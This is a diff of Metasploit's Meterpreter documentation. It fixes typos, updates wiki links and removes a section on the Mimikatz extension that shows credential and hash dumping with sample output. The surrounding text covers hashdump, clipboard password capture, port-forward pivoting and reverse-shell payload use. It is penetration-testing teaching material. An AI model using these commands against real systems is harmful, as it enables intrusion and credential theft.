@@ -30,7 +30,7 @@ Another way to use windows/meterpreter/reverse_tcp is to generate it as an execu
 you would want to do it with msfvenom. If you are old school, you have probably also heard of
 msfpayload and msfencode. msfvenom is a replacement of those.
 
-The following is a basic example of using msfvenom to to generate windows/meterpreter/reverse_tcp
+The following is a basic example of using msfvenom to generate windows/meterpreter/reverse_tcp
 as an executable:
 
 ```
@@ -261,7 +261,7 @@ meterpreter > getsystem
 **hashdump**
 
 The ```hashdump``` commands allows you to dump the Windows hashes if there are the right privileges.
-For sxample:
+For example:
 
 ```
 meterpreter > hashdump
@@ -327,56 +327,6 @@ the specific post module you wish to run, and enter ```info -d``` to see the bas
 documentation.
 
 
-**Using the Mimikatz Extension**
-
-[Mimikatz](https://github.com/gentilkiwi/mimikatz) is a well known tool to extract passwords, hashes, PIN code, and kerberos tickets from memory on Windows. This might actually be the first thing you want to use as soon as you get a high-privileged session, such as SYSTEM.
-
-To begin, load the extension:
-
-```
-meterpreter > load mimikatz
-Loading extension mimikatz...success.
-meterpreter >
-```
-
-This will create more commands for the Meterpreter prompt. Most of them are meant to be used to
-retrieve user names, hashes, passwords and other information:
-
-```
-Mimikatz Commands
-=================
-
-    Command           Description
-    -------           -----------
-    kerberos          Attempt to retrieve kerberos creds
-    livessp           Attempt to retrieve livessp creds
-    mimikatz_command  Run a custom command
-    msv               Attempt to retrieve msv creds (hashes)
-    ssp               Attempt to retrieve ssp creds
-    tspkg             Attempt to retrieve tspkg creds
-    wdigest           Attempt to retrieve wdigest creds
-```
-
-An example of using the ```msv``` command:
-
-```
-meterpreter > msv
-[+] Running as SYSTEM
-[*] Retrieving msv credentials
-msv credentials
-===============
-
-AuthID    Package    Domain           User              Password
-------    -------    ------           ----              --------
-0;313876  NTLM       WIN-6NH0Q8CJQVM  user10            lm{ 0363cb92c563245c447eaf70cfac29c1 }, ntlm{ 16597a07ce66307b3e1a5bd1b7abe123 }
-0;313828  NTLM       WIN-6NH0Q8CJQVM  user10            lm{ 0363cb92c563245c447eaf70cfac29c1 }, ntlm{ 16597a07ce66307b3e1a5bd1b7abe123 }
-0;996     Negotiate  WORKGROUP        WIN-6NH0Q8CJQVM$  n.s. (Credentials KO)
-0;997     Negotiate  NT AUTHORITY     LOCAL SERVICE     n.s. (Credentials KO)
-0;45518   NTLM                                          n.s. (Credentials KO)
-0;999     NTLM       WORKGROUP        WIN-6NH0Q8CJQVM$  n.s. (Credentials KO)
-```
-
-
 **Using the extapi Extension**
 
 The main purpose of the extapi extension is to perform advanced enumeration of the target machine. For
@@ -393,7 +343,7 @@ meterpreter >
 One great feature of the extension is clipboard management. The Windows clipboard is interesting
 because it can store anything that is sensitive, such as files, user names, and passwords, but it is not well protected.
 
-For example, a password manager is a popular tool to store encryped passwords. It allows the user
+For example, a password manager is a popular tool to store encrypted passwords. It allows the user
 to create complex passwords without the need to memorize any of them. All the user needs to do is
 open the password manager, retrieve the password for a particular account by copying it, and then
 paste it on a login page.
@@ -403,7 +353,7 @@ in the operating system's clipboard. As an attacker, you can take advantage of t
 clipboard monitor from Meterpreter/extapi, and then collect whatever the user copies.
 
 To read whatever is currently stored in the target's clipboard, you can use the clipboard_get_data
-commnad:
+command:
 
 ```
 meterpreter > clipboard_get_data
@@ -499,7 +449,7 @@ meterpreter > python_import -f /tmp/test.py
 meterpreter >
 ```
 
-To learn more about the Python extension, please read this [wiki](https://github.com/rapid7/metasploit-framework/wiki/Python-Extension).
+To learn more about the Python extension, please read this [wiki](https://docs.metasploit.com/docs/using-metasploit/advanced/meterpreter/python-extension.html).
 
 **Network Pivoting**
 
@@ -580,7 +530,7 @@ The route command in Meterpreter allows you change the routing table that is on 
 The portfwd command allows you to talk to a remote service like it's local. For example, if you are able to compromise a host via SMB, but are not able to connect to the remote desktop service, then you can do:
 
 ```
-meterpreter > portfwd add –l 3389 –p 3389 –r [Target Host]
+meterpreter > portfwd add -l 3389 -p 3389 -r [Target Host]
 ```
 
 And that should allow you to connect to remote desktop this way on the attacker's box:
@@ -593,13 +543,13 @@ rdesktop 127.0.0.1
 
 The paranoid mode forces the handler to be strict about which Meterpreter should be connecting to it, hence the name "paranoid mode".
 
-To learn more about this feature, please [click here](https://github.com/rapid7/metasploit-framework/wiki/Meterpreter-Paranoid-Mode).
+To learn more about this feature, please [click here](https://docs.metasploit.com/docs/using-metasploit/advanced/meterpreter/meterpreter-paranoid-mode.html).
 
 **Meterpreter Reliable Network Communication**
 
 Exiting Metasploit using ```exit -y``` no longer terminates the payload session like it used to. Instead, it will continue to run behind the scenes, attempting to connect back to Metasploit when an appropriate handler is available. If you wish to exit the session, make sure to ```sessions -K``` first.
 
-To learn more about this feature, please [click here](https://github.com/rapid7/metasploit-framework/wiki/Meterpreter-Reliable-Network-Communication).
+To learn more about this feature, please [click here](https://docs.metasploit.com/docs/using-metasploit/advanced/meterpreter/meterpreter-reliable-network-communication.html).
 
 **Meterpreter Sleep Control**
 
@@ -614,11 +564,11 @@ meterpreter > sleep 20
 And that will allow Meterpreter to sleep 20 seconds, and will reconnect as long as the payload
 handler remains active (such as being a background job).
 
-To learn more about this feature, please [click here](https://github.com/rapid7/metasploit-framework/wiki/Meterpreter-Sleep-Control).
+To learn more about this feature, please [click here](https://docs.metasploit.com/docs/using-metasploit/advanced/meterpreter/meterpreter-sleep-control.html).
 
 **Meterpreter Stageless Mode**
 
-A stageless Meterpreter allows a more economical way to deliver the payload, for cases where a normal one would actually cost too much time and bandwidth in a penetration test. To learn more about this, [click on this](https://github.com/rapid7/metasploit-framework/wiki/Meterpreter-Stageless-Mode) to read more.
+A stageless Meterpreter allows a more economical way to deliver the payload, for cases where a normal one would actually cost too much time and bandwidth in a penetration test. To learn more about this, [click on this](https://docs.metasploit.com/docs/using-metasploit/advanced/meterpreter/meterpreter-stageless-mode.html) to read more.
 
 To use the stageless payload, use ```windows/meterpreter_reverse_tcp``` instead.
 
@@ -640,7 +590,7 @@ OPTIONS:
     -h        Help menu
     -t <opt>  Retry total time (seconds)
     -w <opt>  Retry wait time (seconds)
-    -x <opt>  Expiration timout (seconds)
+    -x <opt>  Expiration timeout (seconds)
 ```
 
 To see the current timeout configuration, you can use the ```get_timeouts``` command:
@@ -653,13 +603,13 @@ Retry Total Time: 3600 seconds
 Retry Wait Time : 10 seconds
 ```
 
-To learn more about timeout control, please [go here](https://github.com/rapid7/metasploit-framework/wiki/Meterpreter-Timeout-Control).
+To learn more about timeout control, please [go here](https://docs.metasploit.com/docs/using-metasploit/advanced/meterpreter/meterpreter-timeout-control.html).
 
 **Meterpreter Transport Control**
 
 Transport Control allows you manage transports on the fly while the payload session is still running. Meterpreter can automatically cycle through the transports when communication fails, or you can do it manually.
 
-To learn more about this, please read this [documentation](https://github.com/rapid7/metasploit-framework/wiki/Meterpreter-Transport-Control).
+To learn more about this, please read this [documentation](https://docs.metasploit.com/docs/using-metasploit/advanced/meterpreter/meterpreter-transport-control.html).
 
 
 ## Using the Post Exploitation API in IRB
@@ -712,5 +662,5 @@ Railgun allows you to use the remote machine's Windows API in Ruby. For example,
 => {"GetLastError"=>0, "ErrorMessage"=>"The operation completed successfully.", "return"=>1}
 ```
 
-To learn more about using Railgun, please read this [wiki](https://github.com/rapid7/metasploit-framework/wiki/How-to-use-Railgun-for-Windows-post-exploitation).
+To learn more about using Railgun, please read this [wiki](https://docs.metasploit.com/docs/development/developing-modules/libraries/how-to-use-railgun-for-windows-post-exploitation.html).
 
